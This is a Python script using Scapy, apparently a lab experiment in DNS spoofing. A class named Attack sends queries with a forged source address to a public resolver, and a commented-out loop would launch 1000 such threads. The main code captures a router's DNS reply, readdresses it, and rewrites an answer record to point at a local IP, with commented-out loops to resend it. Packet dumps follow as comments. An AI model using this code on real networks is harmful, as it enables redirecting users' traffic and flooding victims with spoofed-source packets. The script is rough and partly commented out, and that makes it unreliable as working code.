#coding:utf-8
from scapy.all import *
import threading
import time

class Attack(threading.Thread):
    def  __init__(self):
        threading.Thread.__init__(self)
    def run(self):
        sr1(IP(src="192.168.1.104",dst="8.8.8.8")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")))

if __name__=="__main__":

    # for i in range(1000):
    #     t=Attack()
    #     t.start()
 
    ans,unans = sr( IP(dst="192.168.1.1")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")))
    res = sr1( IP(dst="192.168.1.1")/UDP()/DNS(rd=1,qd=DNSQR(qname="www.baidu.com")))
    
    ans.summary()

    ans.show()
    
    p = res.copy()
    # res.show()
   
    # ###[ Ethernet ]###
    #   dst       = 8c:a9:82:29:2d:6e
    #   src       = f0:eb:d0:0b:11:48
    #   type      = 0x800
    # p = Ether(dst="94:94:26:28:52:C3", src="f0:eb:d0:0b:11:48")/p
    p[IP].dst="192.168.1.104"
    # p[IP].src="8.8.8.8"
    # p[IP].dst="192.168.1.100"

    del(p[UDP].len)
    del(p[UDP].chksum)
    del(p[IP].len)
    del(p[IP].chksum)
    del(p[UDP].sport)

    # p[DNS].qd.qname = "www.baidu.com."
    
    # p[DNS].ancount = 1
    p[DNS].an[DNSRR][2].rdata = '192.168.1.100'
     # = DNSRR(
     #        rrname = 'www.baidu.com.',
     #        type = 'A',
     #        rclass = 'IN',
     #        ttl = 900,
     #        rdata = "192.168.1.100"
     #        )
    # p.dport=[53]
    # p.sport=[60000]
    # p[DNS].dport = [53]
    # p[DNS].sport = [60000]
    # p[DNS].dport = 12345
    # p.dport = 12345

    # print "p.dport = " + str(p.dport)

    # p.show()
    # sendp(p)
    # while True:
    #     sendp(p)
    #     time.sleep(0.5)
 


# ###[ Ethernet ]###
#   dst       = 84:4b:f5:c5:0b:2f
#   src       = 8c:a9:82:29:2d:6e
#   type      = 0x800
# ###[ IP ]###
#      version   = 4L
#      ihl       = 5L
#      tos       = 0x0
#      len       = 86
#      id        = 59908
#      flags     = 
#      frag      = 0L
#      ttl       = 32
#      proto     = udp
#      chksum    = 0xde74
#      src       = 8.8.8.8
#      dst       = 192.168.1.102
#      \options   \
# ###[ UDP ]###
#         sport     = 60000
#         dport     = domain
#         len       = 66
#         chksum    = 0xf4a0
# ###[ DNS ]###
#            id        = 0
#            qr        = 1L
#            opcode    = QUERY
#            aa        = 0L
#            tc        = 0L
#            rd        = 1L
#            ra        = 1L
#            z         = 0L
#            rcode     = ok
#            qdcount   = 1
#            ancount   = 1
#            nscount   = 0
#            arcount   = 0
#            \qd        \
#             |###[ DNS Question Record ]###
#             |  qname     = 'www.cc98.org.'
#             |  qtype     = A
#             |  qclass    = IN
#            \an        \
#             |###[ DNS Resource Record ]###
#             |  rrname    = 'www.cc98.org.'
#             |  type      = A
#             |  rclass    = IN
#             |  ttl       = 900
#             |  rdlen     = 4
#             |  rdata     = '61.135.169.125'
#            ns        = None
#            ar        = None
           
# ###[ Ethernet ]###
#   dst       = 8c:a9:82:29:2d:6e
#   src       = f0:eb:d0:0b:11:48
#   type      = 0x800
# ###[ IP ]###
#      version   = 4L
#      ihl       = 5L
#      tos       = 0x0
#      len       = 131
#      id        = 0
#      flags     = DF
#      frag      = 0L
#      ttl       = 64
#      proto     = udp
#      chksum    = 0xb6b4
#      src       = 192.168.1.1
#      dst       = 192.168.1.100
#      \options   \
# ###[ UDP ]###
#         sport     = domain
#         dport     = 53210
#         len       = 111
#         chksum    = 0x6945
# ###[ DNS ]###
#            id        = 65127
#            qr        = 1L
#            opcode    = QUERY
#            aa        = 0L
#            tc        = 0L
#            rd        = 1L
#            ra        = 1L
#            z         = 0L
#            rcode     = ok
#            qdcount   = 1
#            ancount   = 0
#            nscount   = 1
#            arcount   = 0
#            \qd        \
#             |###[ DNS Question Record ]###
#             |  qname     = 'www.cc98.org.'
#             |  qtype     = AAAA
#             |  qclass    = IN
#            an        = None
#            \ns        \
#             |###[ DNS Resource Record ]###
#             |  rrname    = 'cc98.org.'
#             |  type      = SOA
#             |  rclass    = IN
#             |  ttl       = 1346
#             |  rdlen     = 61
#             |  rdata     = '\x04dns1\x11registrar-servers\x03com\x00\nhostmaster\xc0/w\xfd1\x90\x00\x00\x0e\x10\x00\x00\x07\t\x00\t:\x80\x00\x00\x0e\x11'
#            ar        = None
